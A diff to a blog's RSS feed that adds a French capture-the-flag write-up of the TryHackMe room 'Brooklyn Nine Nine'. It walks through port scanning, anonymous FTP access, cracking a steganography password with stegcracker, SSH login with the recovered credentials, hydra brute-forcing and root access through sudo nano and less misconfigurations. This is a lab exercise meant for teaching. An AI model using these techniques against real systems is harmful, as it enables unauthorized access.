@@ -6,8 +6,136 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 10 Jul 2020 16:32:18 +0200</lastBuildDate>
+        <lastBuildDate>Sun, 26 Jul 2020 21:05:04 +0200</lastBuildDate>
         <atom:link href="https://blog.hugoblanc.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Write-up | Brooklyn Nine Nine</title>
+            <link>https://blog.hugoblanc.com/posts/brooklyn99-writeup/</link>
+            <pubDate>Sun, 26 Jul 2020 21:05:04 +0200</pubDate>
+            
+            <guid>https://blog.hugoblanc.com/posts/brooklyn99-writeup/</guid>
+            <description>Ce write-up couvrira la room Brooklyn Nine Nine, disponible sur Try Hack Me. Let&amp;rsquo;s go !
+Reconnaissance PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 119 May 17 23:17 note_to_jake.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.37.193 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.</description>
+            <content type="html"><![CDATA[<p>Ce write-up couvrira la room Brooklyn Nine Nine, disponible sur <a href="https://www.tryhackme.com">Try Hack Me</a>. Let&rsquo;s go !</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<pre><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.37.193
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Il y a un service web, et il est possible de se connecter en FTP avec les creds de base.
+J&rsquo;utilise ensuite <code>gobuster</code> afin de voir si il y a des folders cachés sur le serveur.</p>
+<pre><code>$ gobuster dir -u 10.10.223.156 -w /usr/share/wordlists/dirb/big.txt 
+...
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/server-status (Status: 403)
+...
+
+</code></pre><p>Rien de bien fou par ici. Je regarde le code source de la page et vois le commentaire suivant :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- Have you ever heard of steganography? --&gt;</span>
+</code></pre></div><p>La page d&rsquo;accueil est composée d&rsquo;une seule image, que je récupère.</p>
+<pre><code>$ steghide info brooklyn99.jpg 
+&quot;brooklyn99.jpg&quot;:
+  format: jpeg
+  capacit�: 3,5 KB
+</code></pre><p>Elle semble contenir des informations, mais je pas le mot de passe pour extraire les données.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>J&rsquo;utilise <code>stegcracker</code> pour tenter de bruteforcer le mot de passe :</p>
+<pre><code>$ python3 /home/paradox/.local/bin/stegcracker brooklyn99.jpg 
+StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2020 - Luke Paris (Paradoxis)
+
+No wordlist was specified, using default rockyou.txt wordlist.
+Counting lines in wordlist..
+Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
+Successfully cracked file with password: [edited]
+...
+</code></pre><p>Je lis ensuite le fichier :</p>
+<pre><code>$ cat brooklyn99.jpg.out
+Holts Password:
+fluffydog12@ninenine
+
+Enjoy!!
+</code></pre><p>C&rsquo;est donc le mot de passe de holt qui est dans ce fichier ! J&rsquo;essaie de me connecter en SSH avec et ça marche !</p>
+<pre><code>$ cat user.txt 
+[edited]
+</code></pre><p>Nous voilà en possession du premier flag !</p>
+<h2 id="élévation-de-privilèges">Élévation de privilèges</h2>
+<pre><code>$ ls
+nano.save  user.txt
+</code></pre><p>Il y a un fichier <code>nano.save</code> (beurk :p), mais nous n&rsquo;avons pas les droits pour l&rsquo;ouvrir. Cependant, <code>nano</code> peut être utilisé par holt sans mot de passe !</p>
+<pre><code>$ sudo -l
+...
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+</code></pre><p>Avec <code>sudo nano nano.save</code>, il est possible de lire le contenu du fichier.
+Mais bon, on ne va pas s&rsquo;engager dans cette voie, pour des raisons évidentes :)</p>
+<p>En effet, si il est possible d&rsquo;utiliser <code>nano</code> en tant que root ans mot de passe, cela veut dire que nous pouvons lire <code>/root/root.txt</code> sans mot de passe également !</p>
+<pre><code>-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: [edited]
+
+Enjoy!!
+</code></pre><p>Et voilà ! :^)</p>
+<h2 id="follow-the-path">Follow The Path</h2>
+<p>L&rsquo;intro de la room nous dit :</p>
+<blockquote>
+<p>There are two main intended ways to root the box.</p>
+</blockquote>
+<p>Essayons de trouver la seconde !</p>
+<p>Je n&rsquo;ai pas encore exploré la piste du service FTP. Pour rappel, on peut se connecter au service FTP avec les creds de base.</p>
+<pre><code>$ ftp 10.10.223.156
+Connected to 10.10.223.156.
+220 (vsFTPd 3.0.3)
+Name (10.10.223.156:paradox): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+</code></pre><p>Il y a un fichier intitulé <code>note_to_jack.txt</code> dans le repertoire. Je le récupère :</p>
+<pre><code>ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+226 Directory send OK.
+ftp&gt; get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+226 Transfer complete.
+119 bytes received in 0.08 secs (1.4554 kB/s)
+</code></pre><p>et l&rsquo;ouvre sur ma machine :</p>
+<pre><code>$ cat note_to_jake.txt 
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+</code></pre><p>À mon avis, il faut utiliser <code>hydra</code> pour bruteforcer le mot de passe SSH de Jake.</p>
+<p>Après pas mal de temps, on finit par trouver le mot de passe de Jack, (il est dans <code>rockyou.txt</code>).</p>
+<p>Une fois connecté en SSH, on voit grâce à <code>sudo -l</code> que <code>less</code> est utilisable as root sans password. On applique donc la même technique qu&rsquo;avant, et on peut lire le flag root !</p>
+]]></content>
+        </item>
         
         <item>
             <title>Write-up | Basic Pentesting: 2</title>
